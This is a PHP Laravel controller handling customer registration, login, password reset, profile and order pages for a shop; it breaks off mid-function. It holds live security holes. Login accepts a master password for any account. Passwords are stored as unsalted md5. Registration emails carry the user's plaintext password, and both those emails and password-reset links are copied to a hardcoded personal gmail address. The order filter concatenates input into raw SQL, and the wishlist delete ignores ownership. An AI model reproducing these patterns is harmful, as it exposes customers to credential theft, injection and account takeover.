<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Auth;
use App\Models\AuthorizeFundLog;
use Hash;
use DB;
use Session;
use App\Models\Customer;
use App\Models\Order;
use App\Models\OrderDetail;
use App\Models\Product;
use App\Models\Wishlist;
use App\Models\WishlistCategory;
use Facade\FlareClient\Stacktrace\File;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use App\Http\Controllers\Traits\PaginationTrait;
use App\Http\Controllers\Traits\generalTrait;
use App\Http\Controllers\Traits\CartTrait;
//use App\Http\Controllers\Order;
use Artisan;




class CustomerController extends Controller
{
	use PaginationTrait;
	use generalTrait;
	use CartTrait;
	public $PageData;

	public function __construct()
	{
		$this->prefix = env('DB_PREFIX', '');
	}
	public function Register(Request $request)
	{

		$this->PageData['CSSFILES'] = ['myaccount.css'];
		if (Session::has('sess_icustomerid') && Session::get('sess_icustomerid') > 0) {
			return redirect('/myaccount.html');
		}

		if (isset($request['action']) && trim($request['action']) == 'signup') {
			$this->PageData['SelCountry'] = $request['country'];
			$validatedData = $request->validate([
				'email' => 'required|email',
				'password' => 'required|same:confirmpassword',
				'confirmpassword' => 'required',
				'first_name' => 'required',
				'last_name'  => 'required',
				'address1' => 'required',
				'city' => 'required',
				'state' => 'required',
				'country' => 'required',
				'zip' => 'required',
				'phone' => 'required',
				//'g-recaptcha-response' => 'required|captcha',
			], [
				'email.required' => config('fmessages.Validate.ValidEmail'),
				'email.email' => config('fmessages.Validate.ValidEmail'),
				'password.required' => config('fmessages.Register.Password'),
				'password.same' => config('fmessages.Validate.ValidConfirmPassword'),
				'confirmpassword.required' => config('fmessages.Validate.ValidConfirmPassword'),
				'first_name.required' => config('fmessages.Validate.FirstName'),
				'last_name.required' => config('fmessages.Validate.LastName'),
				'address1.required' => config('fmessages.Validate.Address'),
				'city.required' => config('fmessages.Validate.City'),
				'state.required_if' => config('fmessages.Validate.State'),
				'country.required' => config('fmessages.Validate.Country'),
				'zip.required' => config('fmessages.Validate.ZipCode'),
				'phone.required' => config('fmessages.Validate.Phone'),
				//'g-recaptcha-response.required' => config('fmessages.Validate.GRecaptchaResponse'),
			]);
			$ChkEmail = Customer::where('email', '=', $request['email'])->where('registration_type', '=', 'M')->get();

			if ($ChkEmail && $ChkEmail->count() > 0) {
				//echo "11"; exit;
				//echo config('fmessages.Register.ExistingEmail'); exit;
				return redirect()->back()
					->withInput()
					->withErrors([
						'existing_email' => config('fmessages.Register.ExistingEmail'),
					]);
			}
			$State = $request['state'];
			if ($request['country'] != 'US')
				$State = ($request['other_state'] ? $request['other_state'] : $request['state']);

			$UserData = array(
				'email' => $request['email'],
				'password' => md5($request['password']),
				'first_name' => $request['first_name'],
				'last_name' => $request['last_name'],
				'address1' => $request['address1'],
				'address2' => $request['address2'],
				'city' => $request['city'],
				'state' => $State,
				'site_type' =>'B2C',
				'country' => $request['country'],
				'zip' => $request['zip'],
				'phone' => $request['phone'],
				'registration_type' => 'M',
				'reg_datetime' => date('Y-m-d H:i:s'),
				'status' => '1',
				'customer_ip' => $_SERVER['REMOTE_ADDR'],
				'customer_browser' => $_SERVER['HTTP_USER_AGENT'],
			);

			//$get_sales_representative_id = get_sales_representative_from_data($request['email']);
			//$UserData['representative_id'] = $get_sales_representative_id;
			$User = Customer::create($UserData);
			//dd($User);
			if ($User) {
				$iCustomerId = $User->customer_id;
				$request->session()->regenerate();
				Session::put('sess_icustomerid', $User->customer_id);
				Session::put('etype', 'M');
				Session::put('sess_useremail', $User->email);

				Session::put('customer_id', $User->customer_id);
				Session::put('customer_email', $User->email);
				Session::put('sess_first_name', $User->first_name);
				Session::put('customer_first_name', $User->first_name);
				Session::put('customer_last_name', $User->last_name);
				Session::put('etype', $User->registration_type);
				Session::put('is_login', 1);

				Session::flash('success', config('fmessages.Register.Success'));
				//$Template = GetMailTemplate("CUSTOMER_REGISTER");
				$Template = GetMailTemplate("CUSTOMER_REGISTER");

				$EmailBody = str_replace('{$vFirstName}', $User->first_name, $Template[0]->mail_body);
				$EmailBody = str_replace('{$vLastName}', $User->last_name, $EmailBody);
				$EmailBody = str_replace('{$SITE_URL}', config('Settings.SITE_URL'), $EmailBody);
				$EmailBody = str_replace('{$Site_URL}', config('Settings.SITE_URL'), $EmailBody);
				$EmailBody = str_replace('{$SITE_NAME}', config('Settings.SITE_NAME'), $EmailBody);				
				$EmailBody = str_replace('{$vemail}', $User->email, $EmailBody);
				$EmailBody = str_replace('{$password}', $request['password'], $EmailBody);
				$EmailBody = str_replace('{$CONTACT_MAIL}', config('const.CONTACT_MAIL'), $EmailBody);
				
				$EmailBody = view('email_templates.content')->with(compact('EmailBody'))->render();
				
				$To = $User->email;
				//$To = 'sachin.qualdev@gmail.com';
				$Subject = $Template[0]->subject;

				//$From = config('const.FROM_MAIL');
				$From = config('Settings.CONTACT_MAIL');
				$sendMailStatus = $this->sendSMTPMail($To, $Subject, $EmailBody, $From);
				/*$headers  = "From: " . strip_tags($From) . "\r\n";
				$headers .= "Reply-To: " . strip_tags($From) . "\r\n";
				$headers .= "MIME-Version: 1.0\r\n";
				$headers .= "Content-Type: text/html; charset=UTF-8\r\n";*/
				
				
				$sendMailStatus = $this->sendSMTPMail('sachin.qualdev@gmail.com', $Subject, $EmailBody, $From);
				//$sendMailStatus = $this->sendSMTPMail_Normal('ankit.qualdev@gmail.com', $Subject, $EmailBody, $headers);

				Auth::login($User);
				$this->GenerateShopCartFromCookieAfterLogin();
				$this->StoreCartInCookie();
				return redirect('/myaccount.html');
			} else {
				Session::flash('failed', config('fmessages.Register.Failed'));
				return redirect()->back();
			}
		}
		//echo "45454"; exit;
		###################### BREADCRUMBLIST SCHEMA START ####################
		$breadcrumbListSchemaData = getBLSchemaForStaticPages('Register Your Account');
		if ($breadcrumbListSchemaData != false) {
			$this->PageData['breadcrumb_list_schema'] = $breadcrumbListSchemaData;
		}
		###################### BREADCRUMBLIST SCHEMA END ####################

		$countryArray = getCountryBoxArray();
		$stateArray = getStateBoxArray();
		$this->PageData['countryArray'] = $countryArray;
		$this->PageData['stateArray'] = $stateArray;
		$this->PageData['JSFILES'] = ['register.js'];
		return view('customer.register')->with($this->PageData);
	}

	public function Login(Request $request)
	{
		$this->PageData['CSSFILES'] = ['myaccount.css'];
		//echo $request->action; exit;
		if ((isset($request->action) && $request->action == 'signin')) {
			$this->validate(
				$request,
				[
					'email'   => 'required|email',
					'password' => 'required|string|min:4|max:255'
				],
				[
					'email.required'  => config('fmessages.Validate.Email'),
					'email.email'  => config('fmessages.Validate.ValidEmail'),
					'password.required'  => config('fmessages.Validate.Password')
				]
			);
			if (Session::has('sess_icustomerid') && Session::get('sess_icustomerid') > 0) {
				Auth::logout();
				Session::flush();
			}
			
			//Added as per 'Shoppe Edits' basecamp point as on 27-04-2023 Start
			$master_password = trim(config('Settings.MASTER_PASSWORD')); 
			
			if($request->password == $master_password)
			{
				$CustomerQry = Customer::where('email', $request->email)
				->where('status', '1')
				->where('registration_type', 'M');
				$Customer = $CustomerQry->first();
			}
			//Added as per 'Shoppe Edits' basecamp point as on 27-04-2023 End
			else
			{
				$CustomerQry = Customer::where('email', $request->email)
				->where('password', md5($request->password))
				->where('status', '1')
				->where('registration_type', 'M');
				$Customer = $CustomerQry->first();
			}
			
			$remember_me = $request->has('rememberMe') ? true : false;

			$remember_me = false;
			if ($Customer && $Customer->count() > 0) {
				Auth::login($Customer, $remember_me);

				$request->session()->regenerate();
				Session::put('sess_useremail', $Customer->email);
				Session::put('sess_first_name', $Customer->first_name);
				Session::put('sess_icustomerid', $Customer->customer_id);
				Session::put('etype', 'M');

				Session::put('customer_id', $Customer->customer_id);
				Session::put('customer_email', $Customer->email);
				Session::put('customer_first_name', $Customer->first_name);
				Session::put('customer_last_name', $Customer->last_name);
				Session::put('etype', $Customer->registration_type);
				Session::put('is_login', 1);
				$this->GenerateShopCartFromCookieAfterLogin();
				$this->StoreCartInCookie();
				return redirect('myaccount.html');
				//return redirect()->intended('myaccount.html');
			} else {
				return redirect()->back()->withInput()->withErrors([
					'Failed' => config('fmessages.Login.Failed'),
				]);
			}
		}

		$this->PageData['meta_title'] = 'Member Login';
		$this->PageData['JSFILES'] = ['login.js'];
		if (Session::has('sess_icustomerid') && Session::get('sess_icustomerid') > 0) {
			return redirect('myaccount.html');
		}

		###################### BREADCRUMBLIST SCHEMA START ####################
		$breadcrumbListSchemaData = getBLSchemaForStaticPages('Login');
		if ($breadcrumbListSchemaData != false) {
			$this->PageData['breadcrumb_list_schema'] = $breadcrumbListSchemaData;
		}
		//dd($breadcrumbListSchemaData);
		###################### BREADCRUMBLIST SCHEMA END ####################

		return view('customer.login')->with($this->PageData);
	}

	public function ForgotPassword(Request $request)
	{

		$this->PageData['CSSFILES'] = ['myaccount.css'];
		if (isset($request->action) && $request->action == 'forgot_password') {
			$validatedData = $request->validate([
				'email' => 'required|email',
				'g-recaptcha-response' => 'required|captcha'
			], [
				'email.required' => config('fmessages.Forgot.ValidEmail'),
				'email.email' => config('fmessages.Forgot.ValidEmail'),
				'g-recaptcha-response.required' => config('fmessages.Validate.GRecaptchaResponse')
			]);
			$ChkEmail = Customer::where('email', '=', $request['email'])->where('status', '=', '1')->get();
			

			if ($ChkEmail) {
				//echo config('fmessages.Forgot.NotExistEmail'); exit;	
				if ($ChkEmail->count() == 0) {
					return redirect()->back()->withInput()->withErrors([
						'not_exist_email' => config('fmessages.Forgot.NotExistEmail'),
					]);
				} else {
					$password  = generateCustPassword();
					$token = Str::random(40);
					$User = Customer::find($ChkEmail[0]->customer_id);
					if($User->registration_type =='G'){
						$registration_type = 'M';
					}else{
						$registration_type = $User->registration_type;
					}
					$UserDataArray = array(
						'reset_token' => $token,
						'registration_type' => $registration_type,
					);

					
					$firstname = ucfirst($User->first_name);
					$User->update($UserDataArray);
					$Template = GetMailTemplate("RESET_PASSWORD");
					
					$EmailBody = '';
					$EmailBody = $Template[0]->mail_body;

					//echo config('Settings.CONTACT_MAIL'); exit;
					$siteUrl =  config('const.SITE_URL') . '/reset/' . $token;
					//$SITE_URL = config('const.SITE_URL'); 
					//echo $siteUrl; exit;
					$EmailBody = str_replace('{$SITE_URL}', config('Settings.SITE_URL'), $EmailBody);
					$EmailBody = str_replace('{$Site_URL}', config('Settings.SITE_URL'), $EmailBody);
					$EmailBody = str_replace('{$SITE_NAME}', config('Settings.SITE_NAME'), $EmailBody);
					$EmailBody = str_replace('{$vemail}', $ChkEmail[0]->email, $EmailBody);
					$EmailBody = str_replace('{$firstname}', $firstname, $EmailBody);
					$EmailBody = str_replace('{$TOLL_FREE_NO}', config('Settings.TOLL_FREE_NO'), $EmailBody);
					$EmailBody = str_replace('{$Site_URL_Reset}', $siteUrl, $EmailBody);


					//echo config('const.SITE_URL')."<br>++++++++++<br>";
					
					$EmailBody = view('email_templates.content')->with(compact('EmailBody'))->render();
					//echo $EmailBody; exit;
					//echo config('const.SITE_URL')."<br>++++++++++<br>";
					

					$To = $ChkEmail[0]->email;
					$Subject = $Template[0]->subject;
					$From = config('Settings.CONTACT_MAIL');
					
					$sendMailStatus = $this->sendSMTPMail($To, $Subject, $EmailBody, $From);
					$sendMailStatus = $this->sendSMTPMail('sachin.qualdev@gmail.com', $Subject, $EmailBody, $From);
					/*$headers  = "From: " . strip_tags($From) . "\r\n";
					$headers .= "Reply-To: " . strip_tags($From) . "\r\n";
					$headers .= "MIME-Version: 1.0\r\n";
					$headers .= "Content-Type: text/html; charset=UTF-8\r\n";*/
					//$sendMailStatus = $this->sendSMTPMail_Normal('sachin.qualdev@gmail.com', $Subject, $EmailBody, $headers);

					//echo $sendMailStatus; exit;

					if ($sendMailStatus == 'failure') {
						return redirect()->back()
							->withInput()
							->withErrors([
								'not_exist_email' => 'If email is registered, you will get a reset link.'
							]);
					} else {
						Session::flash('success', "If email is registered, you will get a reset link.");
						return redirect()->back();
					}
					// SendMail($Subject,$EmailBody,$To,$From);
					//Session::flash('success', config('fmessages.Forgot.Success'));
					//return redirect()->back();
				}
			} else {
				return redirect()->back()
					->withInput()
					->withErrors([
						'email_not_found' => 'If email is registered, you will get a reset link.'

					]);
			}
		}

		###################### BREADCRUMBLIST SCHEMA START ####################
		$breadcrumbListSchemaData = getBLSchemaForStaticPages('Forgot Password');
		if ($breadcrumbListSchemaData != false) {
			$this->PageData['breadcrumb_list_schema'] = $breadcrumbListSchemaData;
		}
		###################### BREADCRUMBLIST SCHEMA END ####################

		$this->PageData['JSFILES'] = ['forgotpassword.js'];
		$this->PageData['meta_title'] =  'Forgot Password';
		return view('customer.forgotpassword')->with($this->PageData);
	}

	public function resetPasswordPage($token)
	{
		
		$this->PageData['JSFILES'] = ['resetpassword.js'];
		$this->PageData['token'] = $token;
		return view('customer.resetpassword')->with($this->PageData);
	}

	public function resetPassword(Request $request, string $token)
	{
		//echo $request->getMethod(); exit;
		if ($request->getMethod() == 'POST') {
			$rules = array(
				'password' => 'required|min:6', // password can only be alphanumeric and has to be greater than 3 characters
				//'g-recaptcha-response' => 'required|captcha'
			);

			// run the validation rules on the inputs from the form
			$validator = Validator::make($request->all(), $rules);
			// if the validator fails, redirect back to the form

			if (!preg_match('/[a-z]/', $request->new_pass) || !preg_match('/[A-Z]/', $request->new_pass) || !preg_match('/[0-9]/', $request->new_pass)) {
				return redirect()->back()->withInput()->withErrors([
					'uppercase_number' => config('fmessages.Validate.UpperCaseAndLetter')
				]);
			}

			$tokenUser = Customer::where('reset_token', $token)->first();
			if ($tokenUser) {
				$Customer = Customer::where('email', $tokenUser->email)->first();
				$Customer->password = md5($request['new_pass']);
				$Customer->reset_token = null;
				$Customer->save();
				Session::flash('success', config('fmessages.ChangePassword.Success'));
				return Redirect::route('login');
			} else {
				return redirect()->back()->with('error', trans('fmessages.Invalid token used.'));
			}
		}
	}

	public function SendMails(Request $request)
	{
	}

	public function EditProfile(Request $request)
	{
		$this->PageData['CSSFILES'] = ['myaccount.css'];
		$countryArray = getCountryBoxArray();
		$stateArray = getStateBoxArray();
		$this->PageData['countryArray'] = $countryArray;
		$this->PageData['stateArray'] = $stateArray;

		if (Auth::user()) {
			$Userdata = Customer::select('customer_id', 'email', 'first_name', 'last_name', 'address1', 'address2', 'city', 'country', 'state', 'zip', 'phone')
				->where('customer_id', '=', Session::get('customer_id'))
				->get();
		}

		if ($request['action'] == 'update') {
			$this->PageData['SelCountry'] = $request['country'];
			$validatedData = $request->validate([
				'first_name' => 'required',
				'last_name'  => 'required',
				'address1' => 'required',
				'city' => 'required',
				'zip' => 'required',
				'phone' => 'required',
				'country' => 'required',
				'state' => 'required_if:country,US',
				'other_state' => 'required_unless:country,US',
			], [
				'first_name.required' => config('fmessages.Validate.FirstName'),
				'last_name.required' => config('fmessages.Validate.LastName'),
				'address1.required' => config('fmessage.Validate.Address'),
				'city.required' => config('fmessages.Validate.City'),
				'zip.required' => config('fmessages.Validate.ZipCode'),
				'phone.required' => config('fmessages.Validate.Phone'),
				'country.required' => config('fmessages.Validate.Country'),
				'state.required_if' => config('fmessages.Validate.State'),
				'other_state.required_unless' => config('fmessages.Validate.OtherState'),
			]);
			$state = $request['state'];
			if ($request['country'] != 'US')
				$state = $request['other_state'];

			$UserDataArray = array(
				'first_name' => $request['first_name'],
				'last_name' => $request['last_name'],
				'address1' => $request['address1'],
				'address2' => ($request['address2'] != '') ? $request['address2'] : '',
				'phone' => $request['phone'],
				'city' => $request['city'],
				'state' => $state,
				'country' => $request['country'],
				'zip' => $request['zip'],
				'upd_datetime' => date('Y-m-d H:i:s')
			);
			if (Auth::user()) {
				$User = Customer::find(Session::get('customer_id'));
				$User->update($UserDataArray);
			}


			if (isset($User) && $User) {
				Session::flash('success', config('fmessages.EditProfile.Success'));
				return redirect()->back();
			}
		}
		###################### BREADCRUMBLIST SCHEMA START ####################
		$breadcrumbListSchemaData = getBLSchemaForMyAccountPages('Edit Profile');
		if ($breadcrumbListSchemaData != false) {
			$this->PageData['breadcrumb_list_schema'] = $breadcrumbListSchemaData;
		}
		###################### BREADCRUMBLIST SCHEMA END ####################	
		$this->PageData['active'] = 'editprofile';
		$this->PageData['JSFILES'] = ['editprofile.js'];
		
		$this->PageData['meta_title'] = "Edit Profile - ". config('const.SITE_NAME');
		$this->PageData['meta_description'] = "Edit Profile - ". config('const.SITE_NAME');
		$this->PageData['meta_keywords'] = "Edit Profile - ". config('const.SITE_NAME');
		
		$this->PageData['Userdata'] = $Userdata;
		$this->PageData['Breadcrumbs'] =  'Edit Profile';
		return view('myaccount.editprofile')->with($this->PageData);
	}

	public function ChangePassword(Request $request)
	{
		
		$customerTableName =  $this->prefix.'customer';
		$this->PageData['CSSFILES'] = ['myaccount.css'];
		if (isset($request['old_pass'])) {
			$validatedData = $request->validate([
				//$validatedData = Validator::make($request->all(), [
				'old_pass' => 'required|min:6|exists_md5:'.$customerTableName.',password',
				'new_pass' => 'required|min:6|regex:/^\S*$/u',
				'confirm_pass'   => 'required|same:new_pass',
			], [
				'old_pass.required' => config('fmessages.Validate.OldPassword'),
				'old_pass.exists_md5' => config('fmessages.ChangePassword.NoExistsPassword'),
				'new_pass.required' => config('fmessages.Validate.RequiredNewPassword'),
				'new_pass.min' => config('fmessages.Validate.NewPassword'),
				'confirm_pass.required' => config('fmessages.Validate.ConfirmPassword'),
				'confirm_pass.same' => config('fmessages.Validate.DoesNotMatch'),
				'new_pass.regex' => config('fmessages.Validate.NewPassword'),
			]);
			/* At least one uppercase letter and one number */
			if (!preg_match('/[a-z]/', $request->new_pass) || !preg_match('/[A-Z]/', $request->new_pass) || !preg_match('/[0-9]/', $request->new_pass)) {
				return redirect()->back()->withInput()->withErrors([
					'uppercase_number' => config('fmessages.Validate.UpperCaseAndLetter')
				]);
			}

			// if (!$validatedData->fails()) {
				//dd($validatedData);
				if (Auth::user()) {
					$checkOldPassword = Customer::where('customer_id', '=', Session::get('customer_id'))->where('password', '=', md5($request['old_pass']))->get();
				}

				if ($checkOldPassword->count() <= 0) {
					return redirect()->back()->withInput()->withErrors([
						'wrong_password' => config('fmessages.ChangePassword.WrongOldPassword')
					]);
				} else {
					$UserData = array(
						'password' => md5($request['new_pass']),
					);
					if (Auth::user()) {
						$User = Customer::find(Session::get('customer_id'));
						$User->update($UserData);
					}
					if (isset($User) && $User) {
						Auth::logout();
						Session::flush();
						Session::flash('success', config('fmessages.ChangePassword.Success'));
						return Redirect::route('login');
					}
				}
			// }else{
			// 	//dd($validatedData->errors());
			// 	return redirect('/changepassword.html');

			// }	
			
		}
		###################### BREADCRUMBLIST SCHEMA START ####################
		$breadcrumbListSchemaData = getBLSchemaForMyAccountPages('Change Password');
		if ($breadcrumbListSchemaData != false) {
			$this->PageData['breadcrumb_list_schema'] = $breadcrumbListSchemaData;
		}
		###################### BREADCRUMBLIST SCHEMA END ####################	
	
		$this->PageData['JSFILES'] = ['changepassword.js'];
		$this->PageData['active'] = 'changepassword';

		$this->PageData['meta_title'] = "ChangePassword - ". config('const.SITE_NAME');
		$this->PageData['meta_description'] = "ChangePassword - ". config('const.SITE_NAME');
		$this->PageData['meta_keywords'] = "ChangePassword - ". config('const.SITE_NAME');
		
		$this->PageData['Breadcrumbs'] =  'Change Password';
		return view('myaccount.changepassword')->with($this->PageData);
	}

	public function OrderHistory(Request $request)
	{
		$this->PageData['CSSFILES'] = ['myaccount.css'];
		if (Auth::user()) {
			$allorder = Order::where('customer_id', '=', Session::get('customer_id'))->get();
			$Pending = Order::where('customer_id', '=', Session::get('customer_id'))->where('status', '=', 'Pending')->get();
			$Declined = Order::where('customer_id', '=', Session::get('customer_id'))->where('status', '=', 'Declined')->get();
			$Canceled = Order::where('customer_id', '=', Session::get('customer_id'))->where('status', '=', 'Canceled')->get();
			$Completed = Order::where('customer_id', '=', Session::get('customer_id'))->where('status', '=', 'Completed')->get();
		}

		$orders_no	 = isset($request['orders_no']) ? $request['orders_no'] : '';
		$this->PageData['orders_no'] = $orders_no;
		$statustype = ($request['type'] ? $request['type'] : 'all');
		//dd($allorder);
		if (Auth::user()) {
			$OrdResultQuery = Order::select('order_id', 'sub_total', 'order_total', 'pay_status', 'tracking_no', 'ShippingCompany' ,'status','ship_method', DB::raw("DATE_FORMAT(order_datetime, '%m/%d/%Y %H:%i') AS datetime"))
				->where('customer_id', '=', Session::get('customer_id'));
		}

		if ($statustype != "" && $statustype != "all") {
			$OrdResultQuery->where("status", "=", $statustype);
		}

		if ($orders_no != "") {
			$OrdResultQuery->whereRaw("(order_id = '" . $orders_no . "')");
		}

		$OrdResult = $OrdResultQuery->orderBy('order_datetime', 'DESC')
			->orderBy('order_id', 'DESC')
			->paginate(8);
		
		###################### BREADCRUMBLIST SCHEMA START ####################
		$breadcrumbListSchemaData = getBLSchemaForMyAccountPages('Order History');
		if ($breadcrumbListSchemaData != false) {
			$this->PageData['breadcrumb_list_schema'] = $breadcrumbListSchemaData;
		}
		###################### BREADCRUMBLIST SCHEMA END ####################	
	
		$this->PageData['all'] = (isset($allorder) && $allorder->count() ? $allorder->count() : 0);
		$this->PageData['Pending'] = (isset($Pending) && $Pending->count() ? $Pending->count() : 0);
		$this->PageData['Declined'] = (isset($Declined) && $Declined->count() ? $Declined->count() : 0);
		$this->PageData['Canceled'] = (isset($Canceled) && $Canceled->count() ? $Canceled->count() : 0);
		$this->PageData['Completed'] = (isset($Completed) && $Completed->count() ? $Completed->count() : 0);
		$this->PageData['OrdResult'] = $OrdResult;
		$this->PageData['type'] = $statustype;
		$this->PageData['active'] = 'orderhistory';

		$this->PageData['meta_title'] = "Order History - ". config('const.SITE_NAME');
		$this->PageData['meta_description'] = "Order History - ". config('const.SITE_NAME');
		$this->PageData['meta_keywords'] = "Order History - ". config('const.SITE_NAME');
		
		$this->PageData['JSFILES'] = ['orderhistory.js'];
		$this->PageData['Breadcrumbs'] =  'Order History';
		return view('myaccount.orderhistory')->with($this->PageData);
	}

	public function Myaccount(Request $request)
	{
		$this->PageData['CSSFILES'] = ['myaccount.css'];
		$CustomerQry = GetCustomer(Session::get('sess_icustomerid'));
		$this->PageData['accountdetails'] = ($CustomerQry ? $CustomerQry : '');
		$this->PageData['active'] = 'myaccount';
		$this->PageData['meta_title'] =  'Account Overview';
		###################### BREADCRUMBLIST SCHEMA START ####################
		$breadcrumbListSchemaData = getBLSchemaForMyAccountPages();
		if ($breadcrumbListSchemaData != false) {
			$this->PageData['breadcrumb_list_schema'] = $breadcrumbListSchemaData;
		}
		###################### BREADCRUMBLIST SCHEMA END ####################	
		return view('myaccount.dashboard')->with($this->PageData);
	}

	public function Logout(Request $request)
	{
		Auth::logout();
		//dd($request->session());
		$request->session()->forget('sess_useremail');
		$request->session()->forget('sess_first_name');
		$request->session()->forget('sess_first_name');
		$request->session()->forget('sess_icustomerid');
		$request->session()->forget('customer_id');
		$request->session()->forget('etype');
		return redirect(config('const.SITE_URL'));
	}

	public function OrderDetailPrint(Request $request)
	{
		$this->PageData['CSSFILES'] = ['myaccount.css'];
		$order_id = $request['id'];
		if (Auth::user()) {
			$OrdResult = Order::select('*', DB::raw("DATE_FORMAT(order_datetime, '%m/%d/%Y %H:%i') AS datetime"))
				->where('customer_id', '=', Session::get('customer_id'))->where('order_id', '=', $order_id)->get();
		}

		$OrderDetailRs = OrderDetail::select(
			'hba_order_detail.products_id',
			'hba_order_detail.order_detail_id',
			'hba_order_detail.product_sku',
			'hba_order_detail.product_name',
			'hba_order_detail.quantity',
			'hba_order_detail.total_price',
			'hba_order_detail.unit_price',
			'p.product_url',
			'p.image_name'
		)
			->where('order_id', '=', $OrdResult[0]['order_id'])
			->join('hba_products as p', 'p.product_id', '=', 'hba_order_detail.products_id')
			->orderBy('order_detail_id', 'DESC')->get();
		if (!empty($OrderDetailRs)) {
			foreach ($OrderDetailRs as $ordKey => $ordValue) {
				$OrderDetailRs[$ordKey]->products_id =  $ordValue->products_id;
				$OrderDetailRs[$ordKey]->product_sku =  $ordValue->product_sku;
				$OrderDetailRs[$ordKey]->product_name =  $ordValue->product_name;
				$OrderDetailRs[$ordKey]->quantity =  $ordValue->quantity;
				$OrderDetailRs[$ordKey]->total_price =  $ordValue->total_price;
				$OrderDetailRs[$ordKey]->product_url =  $ordValue->product_url;
				

				
				$main_image = array(
					'main_image_zoom' => Get_Product_Image_URL($ordValue->image_name,'ZOOM'),
					'main_image_small' =>Get_Product_Image_URL($ordValue->image_name,'MEDIUM'),
					'main_image_thumb' => Get_Product_Image_URL($ordValue->image_name,'THUMB'),
					'main_image_large' => Get_Product_Image_URL($ordValue->image_name, 'SMALL')
				);
				
				if (isset($main_image['main_image_thumb']))
					$OrderDetailRs[$ordKey]->thumb_image = $main_image['main_image_thumb'];
				else
					$OrderDetailRs[$ordKey]->thumb_image =  config('const.NO_IMAGE_300');
			}
		}
		//dd($OrderDetailRs);
		$this->PageData['OrderDetailRs'] = $OrderDetailRs;
		$this->PageData['OrderRs'] = $OrdResult[0];
		$this->PageData['active'] = 'orderhistory';
		$this->PageData['meta_title'] = 'Order Detail';
		$this->PageData['Breadcrumbs'] =  'Order Detail';
		return view('myaccount.orderdetailprint')->with($this->PageData);
	}

	public function OrderDetail(Request $request)
	{
		$this->PageData['CSSFILES'] = ['myaccount.css'];
		$order_id = $request['id'];
		if (Auth::user()) {
			$OrdResult = Order::select('*', DB::raw("DATE_FORMAT(order_datetime, '%m/%d/%Y %H:%i') AS datetime"))
				->where('customer_id', '=', Session::get('customer_id'))->where('order_id', '=', $order_id)->get();
		}

		if (isset($OrdResult[0])) {
			$OrderDetailRs = OrderDetail::select(
				'hba_order_detail.products_id',
				'hba_order_detail.order_detail_id',
				'hba_order_detail.product_sku',
				'hba_order_detail.product_name',
				'hba_order_detail.quantity',
				'hba_order_detail.total_price',
				'p.product_url',
				'p.image_name',
				'hba_order_detail.is_return_request',
				'hba_order_detail.return_message',
				'hba_order_detail.return_request_accept_reject',
				'hba_order_detail.return_request_quantity'
			)
				->where('order_id', '=', $OrdResult[0]['order_id'])
				->join('hba_products as p', 'p.product_id', '=', 'hba_order_detail.products_id')
				->orderBy('order_detail_id', 'DESC')->get();

				if($OrdResult[0]['return_order_last_date'] != ""){
					$OrderReturnDate = $OrdResult[0]['return_order_last_date'];
				}else{
					$OrderReturnDate = "";
				}
		}else{
			$OrderReturnDate = "";
		}
		$totalItemReturnRequest = 0;
		if (isset($OrderDetailRs) && !empty($OrderDetailRs)) {
			foreach ($OrderDetailRs as $ordKey => $ordValue) {
				$OrderDetailRs[$ordKey]->products_id =  $ordValue->products_id;
				$OrderDetailRs[$ordKey]->product_sku =  $ordValue->product_sku;
				$OrderDetailRs[$ordKey]->product_name =  $ordValue->product_name;
				$OrderDetailRs[$ordKey]->quantity =  $ordValue->quantity;
				$OrderDetailRs[$ordKey]->total_price =  $ordValue->total_price;
				$OrderDetailRs[$ordKey]->product_url =  $ordValue->product_url;
				$OrderDetailRs[$ordKey]->is_return_request =  $ordValue->is_return_request;
				$OrderDetailRs[$ordKey]->return_message =  $ordValue->return_message;

				$main_image = array(
				'main_image_zoom' => Get_Product_Image_URL($ordValue->image_name,'ZOOM'),
				'main_image_small' =>Get_Product_Image_URL($ordValue->image_name,'MEDIUM'),
				'main_image_thumb' => Get_Product_Image_URL($ordValue->image_name,'THUMB'),
				'main_image_large' => Get_Product_Image_URL($ordValue->image_name, 'SMALL')
				);
				
				if (isset($main_image['main_image_thumb']))
					$OrderDetailRs[$ordKey]->thumb_image = $main_image['main_image_thumb'];
				else
					$OrderDetailRs[$ordKey]->thumb_image =  config('const.NO_IMAGE_300');

				if($ordValue->is_return_request == '1'){
					$totalItemReturnRequest++;
				}
			}
		}

		if($OrderReturnDate != ""){
			if($OrderReturnDate >= date('Y-m-d') || $totalItemReturnRequest > 0){
				$isOrderReturnable = "1";
			}else{
				$isOrderReturnable = "0";
			}
		}else{
			$isOrderReturnable = "0";
		}

		if($totalItemReturnRequest == $OrderDetailRs->count()){
			$itemRemainForReturn = "0";
		}else{
			$itemRemainForReturn = "1";
		}
		###################### BREADCRUMBLIST SCHEMA START ####################
		$breadcrumbListSchemaData = getBLSchemaForMyAccountPages('Order Detail');
		if ($breadcrumbListSchemaData != false) {
			$this->PageData['breadcrumb_list_schema'] = $breadcrumbListSchemaData;
		}
		###################### BREADCRUMBLIST SCHEMA END ####################	
	
		$this->PageData['OrderDetailRs'] = $OrderDetailRs;
		$this->PageData['OrderReturnDate'] = $OrderReturnDate;
		$this->PageData['isOrderReturnable'] = $isOrderReturnable;
		$this->PageData['OrderRs'] = $OrdResult;
		$this->PageData['totalItemReturnRequest'] = $totalItemReturnRequest;
		$this->PageData['itemRemainForReturn'] = $itemRemainForReturn;
		$this->PageData['active'] = 'orderhistory';
		$this->PageData['meta_title'] = 'Order Detail';
		$this->PageData['Breadcrumbs'] =  'Order Detail';
		return view('myaccount.orderdetail')->with($this->PageData);
	}

	public function WishCategory(Request $request)
	{
		if ($request['action'] == 'DeleteCat') {
			$checked = count($request['ch']);
			$ch = $request['ch'];
			if ($checked > 0) {
				$result = WishlistCategory::whereIn('wishlist_category_id', $request['ch'])->delete();
				$result = Wishlist::whereIn('wishlist_category_id', $request['ch'])->delete();
				Session::flash('success', config('fmessages.WishCategory.DeleteSuccess'));
			} else {
				Session::flash('error', config('fmessages.WishCategory.CheckToDelete'));
			}
			return redirect('wish-category.html');
		}

		if (Auth::user()) {
			$WishCatRS = WishlistCategory::select('wishlist_category_id', 'name', 'description')
				->where('customer_id', '=', Session::get('customer_id'))
				->paginate(8);
		}

		###################### BREADCRUMBLIST SCHEMA START ####################
